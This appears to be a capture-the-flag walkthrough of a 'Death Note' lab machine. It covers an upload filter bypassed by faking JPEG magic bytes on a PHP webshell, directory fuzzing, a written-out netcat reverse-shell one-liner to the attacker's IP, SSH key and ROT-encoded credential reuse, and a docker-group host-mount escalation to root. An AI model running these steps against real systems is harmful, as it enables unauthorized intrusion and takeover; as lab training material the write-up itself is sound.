![](https://i.imgur.com/UaeX0sB.png)

## Initial Enumeration

```bash
❯ nmap -sCV 10.10.63.32

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-19 15:56 WAT
Nmap scan report for 10.10.63.32
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f8:89:12:c0:ab:91:e2:29:1f:55:a6:b1:aa:48:e5:37 (RSA)
|   256 46:05:a8:f4:66:29:41:79:01:a0:43:b8:a9:ef:47:5d (ECDSA)
|_  256 04:db:fa:b1:16:82:c5:99:86:41:ba:8a:ea:72:34:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Death Note - Add Names
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.86 seconds
```

- port `80` (web-server) is open let check it out:

![](https://i.imgur.com/oEN1kPB.jpeg)

- and look what we have an upload page and from the Description it looks like it only accept `jpg` files but still i can test if it accept `php` files:

![](https://i.imgur.com/hP9jrOO.png)

- hmn it didn't work but it show me the acceptable `Magic byte`
- so i used a tool called `hexeditor` to change the magic byte of the `webshell.php` file i wanted to upload before
- using `hexeditor`  you only need to Manually type in `FF D8 FF E0` to the first 4 bytes:

```bash
hexeditor webshell2.php
```

![](https://i.imgur.com/rSElmO7.png)

- then hit `CTRL X` to save the change then upload it and it didn't give any error this time so we can assume it works:
- now we need to `FUZZ` for Directory and hopefully we Find where our code was saved too:

```bash
❯ ffuf -u http://10.10.63.32/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 1196 -e php,txt,aspx,png,jpg 
```

![](https://i.imgur.com/yqWEX3H.png)

- we found `/notes` let check it out:

![](https://i.imgur.com/DlGNsOw.png)

- and we found out file 
- Clicking it will execute it depending on what type of code you uploaded

![](https://i.imgur.com/pF3QQAV.png)

- now to get a reverse shell
- make sure listener is up before executing the below command to the webshell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.3.128 1337 >/tmp/f
```

![](https://i.imgur.com/S3Sw4Xv.png)

- stabilize the shell with:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL Z [KEY]
stty raw -echo;fg
export TERM=xterm
stty rows 40 cols 160
```

- now that we in i moved around the file system looking for credentials but it was taking too much time so i transfer `linppeas` to the machine and run and it found a `ssh` private key but no username with it:

![](https://i.imgur.com/JbZZD1z.png)

- i saved into a file called `id_rsa` on my machine the i change the permission of the file to `600` and try to `ssh` user the two users in the `/home` Directory together with the private key and the key works for user `ryuk`:

![](https://i.imgur.com/CadJHNg.png)

- in the `ryuk` users home Directory we can see the `user.txt` flag but we don't have permission to read it:

![](https://i.imgur.com/ptadCEA.png)

- the file is owned by the `light` user
- but there is another file i can read `rotedcreds`

![](https://i.imgur.com/jWrMTEA.png)

- the name and the content of the file sounds/looks weird 
- so i copy the content and try to decode it (i asked chatgpt):

![](https://i.imgur.com/wQCZYCg.png)

- no we can confirm using [cyberchef](https://gchq.github.io/CyberChef/) :

![](https://i.imgur.com/k0kAARL.png)

- now lets log-in as user `light` :

![](https://i.imgur.com/51klkOU.png)

## privilege Escalation

- running `sudo-l` i found out that the `light` user can't run anything with sudo:

![](https://i.imgur.com/Ah5qavG.png)

- but Checking the `id` of of the `light` user we will see that the user is among the docker group:

![](https://i.imgur.com/oZXfKlu.png)

- so we can enumerate the docker images running:

![](https://i.imgur.com/zMGeqO6.png)

- then i asked chatgpt on how to use the running image to gain root and it provided me with steps and Explanation:

![](https://i.imgur.com/qbqWnMN.png)


**Run an Alpine Container with Host Access:**

- Start an Alpine container with the `--privileged` flag and mount the host filesystem to `/host` inside the container.

```bash
docker run -it --rm --privileged -v /:/host alpine
```

**Change Root to Host Filesystem:**

- Once inside the container, use `chroot` to change the root directory to `/host`, giving you a root shell on the host.

```bash
chroot /host 
```

**Verify Root Access:**

- Check if you have root access on the host by running:

```bash
whoami && id && hostname && cat /root/root.txt 
```

![](https://i.imgur.com/muZciRx.png)

- and if you want to delete the `deathnote`:

![](https://i.imgur.com/FpS1Ib6.png)

## Thanks For Reading 
